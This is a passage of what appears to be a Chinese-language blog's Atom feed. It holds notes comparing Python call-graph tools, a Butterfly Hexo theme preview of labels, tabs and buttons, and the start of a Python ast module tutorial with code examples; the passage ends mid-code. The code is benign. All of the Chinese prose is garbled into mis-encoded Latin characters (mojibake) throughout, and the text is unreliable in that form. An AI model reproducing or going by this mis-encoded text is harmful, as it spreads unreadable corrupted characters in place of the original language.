è¯­è¨€çš„å„ç§ç‰¹æ€§ï¼Œåˆ†ä¸º 16 ä¸ªç±»åˆ«ã€‚</p><img src="https://i.loli.net/2021/07/29/pnfacBJVRN3TISA.jpg" style="zoom:70%;" /><p>å®è§‚åŸºå‡†æµ‹è¯•ï¼ˆMacro-benchmarksï¼‰ä½¿ç”¨ 5 ä¸ªæµè¡Œçš„å¼€æº Python è½¯ä»¶ï¼Œå¹³å‡ç”¨äº† 10h ä¸ºæ¯ä¸ªé¡¹ç›®ç”Ÿæˆè°ƒç”¨å›¾</p><img src="https://i.loli.net/2021/07/29/Sqnl6K27FUxhcPk.jpg" style="zoom:70%;" /><p>PyCG å’Œ Pyan å¯¹æ¯”ï¼ŒPyCG åŸºæœ¬ä¸ºæ‰€æœ‰ä»£ç ç”Ÿæˆäº†å®Œæ•´çš„è°ƒç”¨å›¾ï¼ˆ111/112ï¼‰ï¼ŒSound åªè¦†ç›–äº† 103 æ˜¯å› ä¸ºæ²¡æœ‰è¦†ç›– Python çš„æ˜Ÿå·èµ‹å€¼ï¼›Pyan æ•´ä½“æ¯”è¾ƒæ®‹å¿µï¼Œåœ¨èµ‹å€¼ç›¸å…³çš„æµ‹è¯•ä¸­è¡¨ç°è‰¯å¥½ã€‚</p><img src="https://i.loli.net/2021/07/29/tq5ijGV2YyULTNP.jpg" style="zoom:70%;" /><p>è¿™é‡Œçš„ complete å’Œ sound æ˜¯é™æ€åˆ†æä¸­çš„æ¦‚å¿µï¼š</p><img src="https://i.loli.net/2021/07/29/MbHyi6CXpPJ4aTq.jpg" style="zoom:50%;" /><p>PyCG å’Œ Pyanã€Depends å¯¹æ¯”ï¼Œåœ¨çœŸå®çš„ Python é¡¹ç›®ä¸Šï¼ŒPyCG èƒ½å¤Ÿç”Ÿæˆé«˜ç²¾åº¦çš„è°ƒç”¨å›¾ï¼ŒRecall å€¼è¾ƒä½æ˜¯å› ä¸ºæ–¹æ³•çš„å±€é™å’Œç¼ºä¹å¯¹ Python æŸäº›åŠŸèƒ½ç‰¹æ€§çš„æ”¯æŒã€‚</p><p>å¦å¤–è¿˜æ¯”è¾ƒäº†ä¸€ä¸‹æ—¶é—´å’Œå†…å­˜çš„æ¶ˆè€—ï¼ˆå– 20 æ¬¡çš„å¹³å‡å€¼ï¼‰</p><img src="https://i.loli.net/2021/07/29/4jBnk5lyiJxMouS.jpg" style="zoom:70%;" /><h3 id="3-Qualitative-and-Quantitative-Analysis-of-Callgraph-Algorithms-for-Python"><a href="#3-Qualitative-and-Quantitative-Analysis-of-Callgraph-Algorithms-for-Python" class="headerlink" title="3. Qualitative and Quantitative Analysis of Callgraph Algorithms for Python"></a>3. Qualitative and Quantitative Analysis of Callgraph Algorithms for Python</h3><blockquote><p>2021 International Conference on Code Quality (ICCQ)</p></blockquote><p>æå‡ºäº†ä¸€ä¸ªå¯æ‰©å±•çš„ Python è°ƒç”¨å›¾æ¯”è¾ƒåˆ†ææ¡†æ¶ eval_CGï¼ŒåŒ…å«å¾®è§‚æµ‹è¯•å’Œå®è§‚æµ‹è¯•</p><ul><li>å¾®è§‚æµ‹è¯•ï¼š49 ä¸ªå°å‹ä»£ç ï¼Œåˆ†ä¸º 13ç±»</li><li>å®è§‚æµ‹è¯•ï¼š5 ä¸ªå¼€æº Python é¡¹ç›®ï¼ŒPython roboticsã€mitmproxyã€cookiecutterã€YouCompleteMeã€The Fuck</li></ul><p>å¯¹ä¸åŒçš„è°ƒç”¨å›¾æ„é€ å·¥å…·è¿›è¡Œç³»ç»Ÿçš„æ¯”è¾ƒ</p><ul><li>é™æ€è°ƒç”¨å›¾ï¼ˆCode2flowã€Pyanã€WALAï¼‰</li><li>åŠ¨æ€è°ƒç”¨å›¾ï¼ˆPyCallGraphï¼‰é€šè¿‡åŠ¨æ€åˆ†ææ‰§è¡Œè·¯å¾„ç”Ÿæˆ Python è°ƒç”¨å›¾ï¼Œè¿™ç§åˆ†æåº”è¯¥ç”¨å¦ä¸€ç§æ–¹æ³•ï¼ˆä¾‹å¦‚æ¨¡ç³Šæµ‹è¯•ï¼‰æ¥è·å¾—æœ‰æ„ä¹‰çš„ç»“æœï¼Œå¦åˆ™ä¼šäº§ç”Ÿè®¸å¤šè¯¯æŠ¥</li></ul><p>ç»“è®ºï¼šè¿™äº›å·¥å…·ç”Ÿæˆçš„é™æ€è°ƒç”¨å›¾éƒ½åŒ…å«è™šå‡è¾¹ï¼Œè€Œä¸”éƒ½æ²¡æœ‰ç”Ÿæˆ sound çš„è°ƒç”¨å›¾ï¼ˆæ²¡æœ‰æ¼æŠ¥ï¼‰</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>æ•´ç†äº†å‡ ä¸ªå¯ä»¥ç”¨äºç”Ÿæˆè°ƒç”¨å›¾çš„å·¥å…·ï¼Œä¹‹åè¯•è¯•çœ‹ï¼š</p><ul><li><a href="https://github.com/davidfraser/pyan">Pyan3</a></li><li><a href="https://github.com/vitsalis/pycg">PyCG</a></li><li><a href="https://github.com/scottrogowski/code2flow">Code2flow</a></li><li><a href="https://pyre-check.org/docs/querying-pyre/#dump-call-graph">Pyre - Dump call graph</a></li></ul>]]></content>
    
    
    <summary type="html">æ¦‚è§ˆ</summary>
    
    
    
    <category term="Notes" scheme="https://jckling.github.io/categories/Notes/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Butterfly ä¸»é¢˜é¢„è§ˆ</title>
    <link href="https://jckling.github.io/2021/07/22/Other/Butterfly%20%E4%B8%BB%E9%A2%98%E9%A2%84%E8%A7%88/"/>
    <id>https://jckling.github.io/2021/07/22/Other/Butterfly%20%E4%B8%BB%E9%A2%98%E9%A2%84%E8%A7%88/</id>
    <published>2021-07-22T09:02:46.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰"><a href="#é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰" class="headerlink" title="é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰"></a>é«˜äº®æ–‡å­—ï¼ˆlabelï¼‰</h1><p>åˆ†è¡Œé—´è·ä¼šå¾ˆ</p><mark class="hl-label default">ç°è‰²</mark> <p>å¤§</p><mark class="hl-label blue">è“è‰²</mark> <mark class="hl-label pink">ç²‰è‰²</mark> <mark class="hl-label red">çº¢è‰²</mark> <mark class="hl-label purple">ç´«è‰²</mark> <mark class="hl-label orange">æ©™è‰²</mark> <mark class="hl-label green">ç»¿è‰²</mark> <h1 id="å†…è”å›¾ç‰‡"><a href="#å†…è”å›¾ç‰‡" class="headerlink" title="å†…è”å›¾ç‰‡"></a>å†…è”å›¾ç‰‡</h1><p>é«˜åº¦ 150px å¯é€‰ <img class="inline-img" src="https://i.loli.net/2021/06/14/oSn9dxfYhEHClIe.jpg" style="height:150px"/> ä½†æ˜¯åé¢æ¥çš„æ–‡å­—åˆ°ä¸‹ä¸€è¡Œäº†â€¦</p><h1 id="ç›¸å†Œï¼ˆgalleryï¼‰"><a href="#ç›¸å†Œï¼ˆgalleryï¼‰" class="headerlink" title="ç›¸å†Œï¼ˆgalleryï¼‰"></a>ç›¸å†Œï¼ˆgalleryï¼‰</h1><div class="justified-gallery"><p><img src="https://i.loli.net/2021/06/14/2NXqsznriG8blc7.jpg"><br><img src="https://i.loli.net/2021/06/14/jcdZBHXx9TskmrM.jpg"></p>          </div><h1 id="é€‰é¡¹å¡ï¼ˆTabï¼‰"><a href="#é€‰é¡¹å¡ï¼ˆTabï¼‰" class="headerlink" title="é€‰é¡¹å¡ï¼ˆTabï¼‰"></a>é€‰é¡¹å¡ï¼ˆTabï¼‰</h1><div class="tabs" id="test"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test-1">test 1</button></li><li class="tab"><button type="button" data-href="#test-2">test 2</button></li><li class="tab"><button type="button" data-href="#test-3">test 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>é¢„è®¾é€‰æ‹©ï¼š</p><ul><li>é»˜è®¤æ˜¾ç¤ºç¬¬ 3 ä¸ªï¼š<code>&#123;% tabs test, 3 %&#125;</code></li></ul><p>è‡ªå®šä¹‰åç§°ï¼š</p><ul><li>åç§°ï¼š<code>&lt;!-- tab æµ‹è¯• --&gt;</code></li><li>å›¾æ ‡ï¼š<code>&lt;!-- tab @fas fa-bomb --&gt;</code></li><li>å›¾æ ‡+åç§°ï¼š<code>&lt;!-- tab ç‚¸å¼¹@fas fa-bomb --&gt;</code>ï¼ˆå¿…é¡»åè¿‡æ¥å†™ï¼‰</li></ul><h1 id="æŒ‰é’®ï¼ˆButtonï¼‰"><a href="#æŒ‰é’®ï¼ˆButtonï¼‰" class="headerlink" title="æŒ‰é’®ï¼ˆButtonï¼‰"></a>æŒ‰é’®ï¼ˆButtonï¼‰</h1><a class="btn-beautify button--animated " href="https://jckling.github.io/"   title="Jckling"><span>Jckling</span></a><a class="btn-beautify button--animated " href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline" href="https://jckling.github.io/"   title="Jckling"><span>Jckling</span></a><a class="btn-beautify button--animated outline" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><a class="btn-beautify button--animated block" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated block center larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated block right outline larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><a class="btn-beautify button--animated larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated blue larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated pink larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated red larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated purple larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated orange larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated green larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><div class="btn-center"><a class="btn-beautify button--animated outline larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline blue larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline pink larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline red larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline purple larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline orange larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline green larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a></div><h1 id="æ ‡ç­¾ï¼ˆTagï¼‰"><a href="#æ ‡ç­¾ï¼ˆTagï¼‰" class="headerlink" title="æ ‡ç­¾ï¼ˆTagï¼‰"></a>æ ‡ç­¾ï¼ˆTagï¼‰</h1><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><div class="note simple"><p>é»˜è®¤</p></div><div class="note default simple"><p>default</p></div><div class="note primary simple"><p>primary</p></div><div class="note success simple"><p>success</p></div><div class="note info simple"><p>info</p></div><div class="note warning simple"><p>warning</p></div><div class="note danger simple"><p>danger</p></div><h2 id="morden"><a href="#morden" class="headerlink" title="morden"></a>morden</h2><div class="note modern"><p>é»˜è®¤</p></div><div class="note default modern"><p>default</p></div><div class="note primary modern"><p>primary</p></div><div class="note success modern"><p>success</p></div><div class="note info modern"><p>info</p></div><div class="note warning modern"><p>warning</p></div><div class="note danger modern"><p>danger</p></div><h2 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h2><div class="note flat"><p>é»˜è®¤</p></div><div class="note default flat"><p>default</p></div><div class="note primary flat"><p>primary</p></div><div class="note success flat"><p>success</p></div><div class="note info flat"><p>info</p></div><div class="note warning flat"><p>warning</p></div><div class="note danger flat"><p>danger</p></div><h2 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h2><div class="note disabled"><p>é»˜è®¤</p></div><div class="note default disabled"><p>default</p></div><div class="note primary disabled"><p>primary</p></div><div class="note success disabled"><p>success</p></div><div class="note info disabled"><p>info</p></div><div class="note warning disabled"><p>warning</p></div><div class="note danger disabled"><p>danger</p></div><h2 id="é¢œè‰²å’Œå›¾æ ‡"><a href="#é¢œè‰²å’Œå›¾æ ‡" class="headerlink" title="é¢œè‰²å’Œå›¾æ ‡"></a>é¢œè‰²å’Œå›¾æ ‡</h2><div class="note blue flat"><p>fas fa-bullhorn</p></div><div class="note icon flat"><i class="note-icon fas fa-bullhorn"></i><p>fas fa-bullhorn</p></div><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>fas fa-bullhorn</p></div><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>ç¿»æ–‡æ¡£ï¼š</p><ul><li><a href="https://butterfly.js.org/posts/ceeb73f/">Butterfly å®‰è£æ–‡æª”(å››) ä¸»é¡Œé…ç½®-2</a></li><li><a href="https://butterfly.js.org/posts/507c070f/">Butterflyæ·»åŠ å…¨å±€å¸åº•Aplayeræ•™ç¨‹</a></li></ul>]]></content>
    
    
    <summary type="html">æ¸²æŸ“ä¸€äº›ä¼šç”¨åˆ°ï¼Œä½†æ¯æ¬¡éƒ½å¾—ç¿»æ–‡æ¡£æ‰¾çš„ä¸œè¥¿ğŸ˜…</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>Python ast æ¨¡å—ä½¿ç”¨</title>
    <link href="https://jckling.github.io/2021/07/14/Other/Python%20ast%20%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/07/14/Other/Python%20ast%20%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</id>
    <published>2021-07-14T06:30:05.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-æºç ç¼–è¯‘è¿‡ç¨‹"><a href="#Python-æºç ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="Python æºç ç¼–è¯‘è¿‡ç¨‹"></a>Python æºç ç¼–è¯‘è¿‡ç¨‹</h1><p>Python æºç åˆ°æœºå™¨ç çš„è¿‡ç¨‹ï¼Œä»¥ CPython ä¸ºä¾‹ï¼Œç¼–è¯‘è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å°†æºä»£ç è§£æä¸ºè§£ææ ‘ï¼ˆParser Treeï¼‰</li><li>å°†è§£ææ ‘è½¬æ¢ä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆAbstract Syntax Treeï¼‰</li><li>å°†æŠ½è±¡è¯­æ³•æ ‘è½¬æ¢åˆ°æ§åˆ¶æµå›¾ï¼ˆControl Flow Graphï¼‰</li><li>æ ¹æ®æµå›¾å°†å­—èŠ‚ç ï¼ˆbytecodeï¼‰å‘é€ç»™è™šæ‹Ÿæœºï¼ˆcevalï¼‰</li></ul><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ¨¡å—è¿›è¡Œæ“ä½œï¼š</p><ul><li>ast æ¨¡å—å¯ä»¥æ§åˆ¶æŠ½è±¡è¯­æ³•æ ‘çš„ç”Ÿæˆå’Œç¼–è¯‘</li><li>py-compile æ¨¡å—èƒ½å¤Ÿå°†æºç æ¢æˆå­—èŠ‚ç ï¼ˆç¼–è¯‘ï¼‰ï¼Œä¿å­˜åœ¨ __pycache__ æ–‡ä»¶å¤¹ï¼Œä»¥ <code>.pyc</code> ç»“å°¾ï¼ˆä¸å¯è¯»ï¼‰</li><li>dis æ¨¡å—é€šè¿‡åæ±‡ç¼–æ”¯æŒå¯¹å­—èŠ‚ç çš„åˆ†æï¼ˆå¯è¯»ï¼‰</li></ul><h1 id="ast-æ¨¡å—ä½¿ç”¨"><a href="#ast-æ¨¡å—ä½¿ç”¨" class="headerlink" title="ast æ¨¡å—ä½¿ç”¨"></a>ast æ¨¡å—ä½¿ç”¨</h1><p>ast æ¨¡å—å¯ä»¥ç”¨äºç”Ÿæˆå’Œç¼–è¯‘ Python ä»£ç çš„æŠ½è±¡è¯­æ³•æ ‘ï¼Œè®¸å¤šé™æ€åˆ†æå·¥å…·éƒ½ä½¿ç”¨è¯¥æ¨¡å—ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ã€‚</p><p><code>ast.parse()</code> å‡½æ•°å¯ä»¥ç”¨æ¥ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œ<code>ast.compile()</code> å¯ä»¥å°†æŠ½è±¡è¯­æ³•æ ‘ç¼–è¯‘ä¸ºä»£ç ã€‚</p><p>ç”¨ä¸‹åˆ—ä»£ç ä½œä¸ºæµ‹è¯•æ ·ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nums</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;even: &quot;</span>, i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot; odd: &quot;</span>, i)</span><br><span class="line"></span><br><span class="line">nums()</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘æ‰§è¡Œ"><a href="#ç¼–è¯‘æ‰§è¡Œ" class="headerlink" title="ç¼–è¯‘æ‰§è¡Œ"></a>ç¼–è¯‘æ‰§è¡Œ</h2><p>ä»£ç å¯¹è±¡æ˜¯ CPython å®ç°çš„ä½çº§ç»†èŠ‚ï¼Œæ¶‰åŠ code æ¨¡å—ï¼Œè¯¥æ¨¡å—æ˜¯è§£é‡Šå™¨åŸºç±»ï¼Œå¯ç”¨äºè‡ªå®šä¹‰ Python è§£é‡Šå™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¯»å–æºæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;demo.py&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¯ä»¥è¢« exec() æˆ– eval() æ‰§è¡Œçš„ä»£ç å¯¹è±¡</span></span><br><span class="line">cm = <span class="built_in">compile</span>(data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">exec(cm)</span><br></pre></td></tr></table></figure><h2 id="ç”Ÿæˆ-AST"><a href="#ç”Ÿæˆ-AST" class="headerlink" title="ç”Ÿæˆ AST"></a>ç”Ÿæˆ AST</h2><p>ç›´æ¥ä»æºç ç”Ÿæˆï¼ŒPython 3.9 æ”¯æŒ <code>indent</code> å‚æ•°ï¼Œæ‰“å°è¾“å‡ºæ›´ä¸ºå‹å¥½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_ast = ast.parse(data)</span><br><span class="line">print(ast.dump(f_ast, indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Module( <span class="comment"># ç¬¬ä¸€çº§ï¼Œæ¨¡å—</span></span><br><span class="line">    body=[</span><br><span class="line">        FunctionDef( <span class="comment"># ç¬¬äºŒçº§ï¼Œå‡½æ•°å®šä¹‰</span></span><br><span class="line">            name=<span class="string">&#x27;nums&#x27;</span>, <span class="comment"># å‡½æ•°åç§°</span></span><br><span class="line">            args=arguments( <span class="comment"># å‚æ•°</span></span><br><span class="line">                posonlyargs=[],</span><br><span class="line">                args=[],</span><br><span class="line">                kwonlyargs=[],</span><br><span class="line">                kw_defaults=[],</span><br><span class="line">                defaults=[]),</span><br><span class="line">            body=[ <span class="comment"># å‡½æ•°ä½“</span></span><br><span class="line">                For( <span class="comment"># å¾ªç¯</span></span><br><span class="line">                    target=Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Store()),</span><br><span class="line">                    iter=Call( <span class="comment"># é€’å½’å‡½æ•°è°ƒç”¨</span></span><br><span class="line">                        func=Name(id=<span class="string">&#x27;range&#x27;</span>, ctx=Load()),</span><br><span class="line">                        args=[</span><br><span class="line">                            Constant(value=2)], <span class="comment"># å‚æ•°</span></span><br><span class="line">                        keywords=[]),</span><br><span class="line">                    body=[ <span class="comment"># å¾ªç¯ä½“</span></span><br><span class="line">                        If( <span class="comment"># æ¡ä»¶åˆ¤æ–­</span></span><br><span class="line">                            <span class="built_in">test</span>=Compare(<span class="comment"># æ¯”è¾ƒ</span></span><br><span class="line">                                left=BinOp( <span class="comment"># å·¦æ“ä½œæ•°</span></span><br><span class="line">                                    left=Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load()), <span class="comment"># å·¦æ“ä½œæ•°</span></span><br><span class="line">                                    op=Mod(), <span class="comment"># æ“ä½œç¬¦</span></span><br><span class="line">                                    right=Constant(value=2)), <span class="comment"># å³æ“ä½œæ•°</span></span><br><span class="line">                                ops=[</span><br><span class="line">                                    Eq()],</span><br><span class="line">                                comparators=[ <span class="comment"># å³æ“ä½œæ•°</span></span><br><span class="line">                                    Constant(value=0)]),</span><br><span class="line">                            body=[ <span class="comment"># ä¸ºçœŸ</span></span><br><span class="line">                                Expr(</span><br><span class="line">                                    value=Call( <span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line">                                        func=Name(id=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                        args=[</span><br><span class="line">                                            Constant(value=<span class="string">&#x27;even: &#x27;</span>),</span><br><span class="line">                                            Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load())],</span><br><span class="line">                                        keywords=[]))],</span><br><span class="line">                            orelse=[ <span class="comment"># ä¸ºå‡</span></span><br><span class="line">                                Expr(</span><br><span class="line">                                    value=Call( <span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line">                                        func=Name(id=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                        args=[</span><br><span class="line">                                            Constant(value=<span class="string">&#x27; odd: &#x27;</span>),</span><br><span class="line">                                            Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load())],</span><br><span class="line">                                        keywords=[]))])],</span><br><span class="line">                    orelse=[])],</span><br><span class="line">            decorator_list=[]),</span><br><span class="line">        Expr( <span class="comment"># ç¬¬äºŒçº§ï¼Œè¡¨è¾¾å¼è¯­å¥</span></span><br><span class="line">            value=Call( <span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line">                func=Name(id=<span class="string">&#x27;nums&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure><h2 id="éå†-AST"><a href="#éå†-AST" class="headerlink" title="éå† AST"></a>éå† AST</h2><h2 id="ä¿®æ”¹-AST"><a href="#ä¿®æ”¹-AST" class="headerlink" title="ä¿®æ”¹ AST"></a>ä¿®æ”¹ AST</h2><p>æœ‰ä¸¤ç§æ–¹å¼ï¼šâ‘ ä¿®æ”¹ AST èŠ‚ç‚¹ï¼›â‘¡æ›¿æ¢ AST èŠ‚ç‚¹ã€‚ast æ¨¡å—æä¾›äº† <code>NodeVisitor</code> å’Œ <code>NodeTransformer</code> å®ç°è¿™ä¸¤ç§åŠŸèƒ½ã€‚</p><ol><li><p>å°† <code>i%2 == 0</code>ä¿®æ”¹ä¸º <code>i+2==0</code></p><ul><li><code>ast.NodeVisitor.visit</code> å¦‚æœæ²¡æœ‰å®ç°å¯¹è±¡çš„ <code>visit_classname</code> æ–¹æ³•ï¼Œåˆ™è°ƒç”¨ <code>generic_visit</code> æ–¹æ³•</li><li><code>ast.NodeVisitor.generic_visit</code> åœ¨å­èŠ‚ç‚¹ä¸Šè°ƒç”¨ <code>visit</code> æ–¹æ³•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeVisitor</span>(<span class="params">ast.NodeVisitor</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit_BinOp</span>(<span class="params">self, node</span>):</span> <span class="comment"># ä¿®æ”¹æ“ä½œç¬¦</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.op, ast.Mod):</span><br><span class="line">            node.op = ast.Add()</span><br><span class="line">        self.generic_visit(node) <span class="comment"># éå†å­èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line">visitor = NodeVisitor()</span><br><span class="line">visitor.visit(f_ast) <span class="comment"># éå†</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">odd:  0</span><br><span class="line">odd:  1</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ <code>else</code> èŠ‚ç‚¹</p><ul><li>è°ƒç”¨ <code>compile()</code> å‡½æ•°æ—¶ç¼ºå¤± <code>lineno</code> å’Œ <code>col_offset</code> å±æ€§ï¼Œä½¿ç”¨ <code>ast.fix_missing_locations</code> å‡½æ•°æ·»åŠ </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeTransformer</span>(<span class="params">ast.NodeTransformer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit_If</span>(<span class="params">self, node</span>):</span></span><br><span 